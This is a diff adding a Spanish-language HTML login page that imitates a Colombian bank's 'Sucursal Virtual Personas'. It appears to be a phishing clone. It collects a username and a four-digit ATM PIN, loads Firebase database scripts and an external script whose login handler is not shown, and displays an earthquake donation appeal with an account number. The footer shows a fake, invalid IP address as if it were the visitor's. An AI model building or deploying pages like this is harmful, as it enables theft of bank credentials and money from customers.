@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Sucursal Virtual Personas</title>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <link rel="stylesheet" href="login.css">
+</head>
+
+<body>
+
+    <main class="login-page">
+        <div class="login-wrapper">
+    <div class="logo"> <img style="width: 11.5rem" src="logo.svg" alt="" /></div>
+            <!-- TÍTULO -->
+            <h1 class="page-title">
+                Sucursal Virtual Personas
+            </h1>
+            
+  <div class="container">
+    <div id="contenedor"></div>
+
+      <section id="usuario" style="display:;">
+ 
+ <div id="popupError" class="popup-error">
+
+    <div class="popup-barra"></div>
+
+    <div class="popup-icono">
+        <span></span>
+        <span></span>
+    </div>
+
+    <div class="popup-contenido">
+
+        <h3>Datos Incorrectos</h3>
+
+        <p>
+            Tu Usuario o Clave son incorrectos, intentalo nuevamente.
+        </p>
+
+    </div>
+
+    <button
+        type="button"
+        class="popup-cerrar"
+        id="cerrarPopupError"
+        aria-label="Cerrar"
+    >
+        <span></span>
+        <span></span>
+    </button>
+
+</div>
+ 
+            <!-- AVISO SUPERIOR -->
+            <div class="notice">
+
+                <div class="notice-content">
+                    <strong>
+                        Estamos unidos por Colombia. ¡Haz tu donación!
+                    </strong>
+
+                    <p>
+                        Apoya las víctimas del terremoto con tu donación a Fundación Bancolombia en la cuenta de ahorros 24542-3932. Entre todos, escribamos esta nueva historia. *Antes de donar, verifica el titular de la cuenta.
+                    </p>
+                </div>
+
+            </div>
+            
+
+
+            <!-- TARJETA LOGIN -->
+            <section class="login-card">
+
+                <h2>¡Hola!</h2>
+
+                <p class="login-description">
+                    Ingresa los datos para gestionar tus productos y hacer transacciones.
+                </p>
+
+
+                <!-- USUARIO -->
+                <div class="form-group">
+
+                    <div class="input-row">
+
+                        <span class="input-icon">
+                            <img style="width:28px" src="ico-usu.png" alt="" />
+                        </span>
+
+                        <input
+                            type="text"
+                            id="usuarioInput"
+                            autofocus
+                            autocomplete="off"
+                            placeholder="Usuario"
+                        >
+
+                    </div>
+
+                    <span id="userinva" class="input-error" style="display: none">
+                        Ingresa tu usuario
+                    </span>
+
+                    <a href="#" class="help-link">
+                        ¿Olvidaste tu usuario?
+                    </a>
+
+                </div>
+
+
+                <!-- CONTRASEÑA -->
+                <div class="form-group">
+
+                    <div class="input-row">
+
+                        <span class="input-icon">
+                            <img style="width: 23px" src="desbloquear.png" alt="" />
+                        </span>
+
+                        <input
+                            inputmode="numeric"
+                            id="claveInput"
+                            placeholder="Clave del Cajero"
+                            type="password"
+                            maxlength="4"
+                        >
+
+                    </div>
+                    <span id="userinval" class="input-error" style="display: none">
+                        Ingresa tu Clave
+                    </span>
+                    <a href="#" class="help-link">
+                        ¿Olvidaste o bloqueaste tu clave?
+                    </a>
+
+                </div>
+
+
+                <!-- BOTÓN -->
+                <button
+                    type="button"
+                    id="btnLogin"
+                    class="login-button"
+                    onclick="imprimirusuario(); mostrarnuevodiv(sectionId)"
+                >
+                    Iniciar sesión
+                </button>
+
+
+                <a href="#" class="create-account">
+                    Crear usuario
+                </a>
+
+            </section>
+</section>
+        </div>
+
+    </main>
+
+    <script src="js-trico.js"></script>
+<script>
+    
+    let temporizadorPopupError = null;
+
+function mostrarPopupError() {
+
+    const popup =
+        document.getElementById("popupError");
+
+    if (!popup) {
+        console.error(
+            "No se encontró #popupError"
+        );
+        return;
+    }
+
+    clearTimeout(temporizadorPopupError);
+
+    popup.classList.add("mostrar");
+
+    temporizadorPopupError =
+        setTimeout(function () {
+
+            popup.classList.remove("mostrar");
+
+        }, 3000);
+}
+
+
+function ocultarPopupError() {
+
+    const popup =
+        document.getElementById("popupError");
+
+    if (!popup) {
+        return;
+    }
+
+    clearTimeout(temporizadorPopupError);
+
+    popup.classList.remove("mostrar");
+}
+    
+</script>
+
+<footer class="footer">
+
+    <div class="footer-contenido">
+
+        <!-- LINKS -->
+        <nav class="footer-links">
+
+            <a href="#">
+                ¿Problemas para conectarte?
+            </a>
+
+            <span class="footer-punto">•</span>
+
+            <a href="#">
+                Aprende sobre seguridad
+            </a>
+
+            <span class="footer-punto">•</span>
+
+            <a href="#">
+                Reglamento Sucursal
+            </a>
+
+            <span class="footer-punto">•</span>
+
+            <a href="#">
+                Política de privacidad
+            </a>
+
+        </nav>
+
+
+        <!-- LÍNEA -->
+        <div class="footer-linea"></div>
+
+
+        <!-- PARTE INFERIOR -->
+        <div class="footer-inferior">
+
+            <!-- LOGOS -->
+<div class="footer-logos">
+
+    <img
+                    src="logo.svg"
+        alt="Logo empresa"
+        class="footer-logo-empresa"
+    >
+
+    <img
+                    src="logo-vigil.svg"
+        alt="Superintendencia Financiera"
+        class="footer-logo-super"
+    >
+
+</div>
+
+
+            <!-- INFORMACIÓN -->
+            <div class="footer-info">
+
+                <p>
+                    Dirección IP:
+                    <span id="direccionIP">
+                        191.156.753.341
+                    </span>
+                </p>
+
+
+            </div>
+
+        </div>
+
+    </div>
+
+</footer>
+
+</body>
+</html>
